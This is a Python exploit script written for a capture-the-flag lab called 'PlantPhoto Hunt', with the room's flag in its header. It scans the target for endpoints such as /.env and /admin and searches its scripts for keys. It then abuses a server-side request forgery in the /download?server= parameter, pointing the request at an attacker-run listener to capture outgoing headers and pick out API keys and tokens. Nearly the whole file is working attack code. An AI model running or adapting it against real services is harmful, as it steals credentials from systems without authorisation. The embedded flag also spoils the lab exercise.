"""
PlantPhoto Hunt - SSRF exploit to leak API key
Target: http://10.82.168.213/
Attack: Redirect /download?server= to our listener to capture outgoing request headers (API key)

THM{Hello_Im_just_an_API_key}
"""
import requests
import subprocess
import sys
import threading
import time
from http.server import HTTPServer, BaseHTTPRequestHandler

TARGET = "http://10.82.168.213"
ATTACKER_IP = "10.82.105.71"
ATTACKER_PORT = 9999


# ── Step 1: Recon ──────────────────────────────────────────────────────────────

def recon():
    """Explore the target site for endpoints and interesting patterns."""
    print("=" * 60)
    print("[RECON] Scanning target...")
    print("=" * 60)

    # Grab homepage
    r = requests.get(TARGET, timeout=10)
    print(f"\n[+] Homepage status: {r.status_code}")
    print(f"[+] Headers: {dict(r.headers)}")

    # Extract links/endpoints from HTML
    import re
    links = set(re.findall(r'(?:href|src|action)=["\']([^"\']+)["\']', r.text))
    print(f"\n[+] Found {len(links)} links/resources in HTML:")
    for link in sorted(links):
        print(f"    {link}")

    # Look for JS files that might reveal API endpoints
    js_files = [l for l in links if l.endswith('.js')]
    for js in js_files:
        js_url = js if js.startswith('http') else f"{TARGET}/{js.lstrip('/')}"
        print(f"\n[+] Fetching JS: {js_url}")
        jr = requests.get(js_url, timeout=10)
        # Search for API keys, endpoints, fetch calls
        api_patterns = re.findall(r'(?:api[_-]?key|authorization|token|fetch|axios|/api/|/download)[^\n]{0,200}', jr.text, re.IGNORECASE)
        for p in api_patterns:
            print(f"    >> {p.strip()}")

    # Try the download endpoint with original params
    download_url = f"{TARGET}/download?server=secure-file-storage.com:8087&id=75482342"
    print(f"\n[+] Testing original download URL: {download_url}")
    r = requests.get(download_url, timeout=10)
    print(f"    Status: {r.status_code}")
    print(f"    Headers: {dict(r.headers)}")
    print(f"    Body (first 500 chars): {r.text[:500]}")

    # Try common endpoints
    common = ["/robots.txt", "/sitemap.xml", "/.env", "/api", "/api/keys",
              "/admin", "/config", "/download", "/status", "/health"]
    print("\n[+] Probing common endpoints:")
    for ep in common:
        try:
            r = requests.get(f"{TARGET}{ep}", timeout=5)
            if r.status_code != 404:
                print(f"    {ep} -> {r.status_code} ({len(r.text)} bytes)")
        except:
            pass

    print("\n" + "=" * 60)


# ── Step 2: SSRF - Redirect server to our listener ────────────────────────────

class CaptureHandler(BaseHTTPRequestHandler):
    """HTTP handler that captures and prints all incoming request details."""

    captured = []

    def do_GET(self):
        self._capture("GET")

    def do_POST(self):
        content_length = int(self.headers.get('Content-Length', 0))
        body = self.rfile.read(content_length) if content_length else b''
        self._capture("POST", body)

    def do_PUT(self):
        content_length = int(self.headers.get('Content-Length', 0))
        body = self.rfile.read(content_length) if content_length else b''
        self._capture("PUT", body)

    def _capture(self, method, body=None):
        print("\n" + "!" * 60)
        print(f"[CAPTURED] Incoming {method} request!")
        print(f"  Path: {self.path}")
        print(f"  Headers:")
        for k, v in self.headers.items():
            print(f"    {k}: {v}")
        if body:
            print(f"  Body: {body.decode(errors='replace')}")
        print("!" * 60)

        CaptureHandler.captured.append({
            "method": method,
            "path": self.path,
            "headers": dict(self.headers),
            "body": body.decode(errors='replace') if body else None
        })

        # Send a dummy response back
        self.send_response(200)
        self.send_header("Content-Type", "application/json")
        self.end_headers()
        self.wfile.write(b'{"status": "ok", "data": "captured"}')

    def log_message(self, format, *args):
        pass  # Suppress default logging


def start_listener(port):
    """Start HTTP listener to capture the redirected request."""
    server = HTTPServer(("0.0.0.0", port), CaptureHandler)
    print(f"[*] Listener started on 0.0.0.0:{port}")
    server.handle_request()  # Handle one request then return
    return server


def ssrf_exploit():
    """Trigger SSRF by pointing server= to our listener to capture API key."""
    print("\n" + "=" * 60)
    print("[SSRF] Exploiting download endpoint...")
    print(f"[SSRF] Redirecting server to {ATTACKER_IP}:{ATTACKER_PORT}")
    print("=" * 60)

    # Start listener in a thread
    server_thread = threading.Thread(target=start_listener, args=(ATTACKER_PORT,), daemon=True)
    server_thread.start()
    time.sleep(1)  # Give server time to bind

    # Trigger the SSRF - point server to our listener
    # Try different variations
    payloads = [
        f"{ATTACKER_IP}:{ATTACKER_PORT}",
        f"http://{ATTACKER_IP}:{ATTACKER_PORT}",
    ]

    for payload in payloads:
        ssrf_url = f"{TARGET}/download?server={payload}&id=75482342"
        print(f"\n[*] Triggering: {ssrf_url}")
        try:
            r = requests.get(ssrf_url, timeout=10)
            print(f"    Response status: {r.status_code}")
            print(f"    Response body (first 500): {r.text[:500]}")
        except requests.exceptions.Timeout:
            print("    [!] Request timed out (server might be connecting to us)")
        except Exception as e:
            print(f"    [!] Error: {e}")
        time.sleep(2)

    # Check captures
    if CaptureHandler.captured:
        print("\n" + "=" * 60)
        print("[SUCCESS] Captured request(s)! Check headers for API key above.")
        print("=" * 60)
        for cap in CaptureHandler.captured:
            for k, v in cap["headers"].items():
                if any(x in k.lower() for x in ["api", "key", "auth", "token", "secret"]):
                    print(f"\n  >>> POTENTIAL API KEY: {k}: {v} <<<")
    else:
        print("\n[!] No requests captured. The server might not connect back.")
        print("[!] Try running a listener manually: python -m http.server 9999")
        print(f"[!] Then visit: {TARGET}/download?server={ATTACKER_IP}:{ATTACKER_PORT}&id=75482342")


# ── Main ───────────────────────────────────────────────────────────────────────

if __name__ == "__main__":
    if "--recon" in sys.argv or "--all" in sys.argv:
        recon()
    if "--ssrf" in sys.argv or "--all" in sys.argv:
        ssrf_exploit()
    if len(sys.argv) == 1:
        print("Usage: python plant_hunt_api.py [--recon] [--ssrf] [--all]")
        print("\n  --recon  Scan target for endpoints and info")
        print("  --ssrf   Run SSRF exploit (redirects to attacker listener)")
        print("  --all    Run everything")
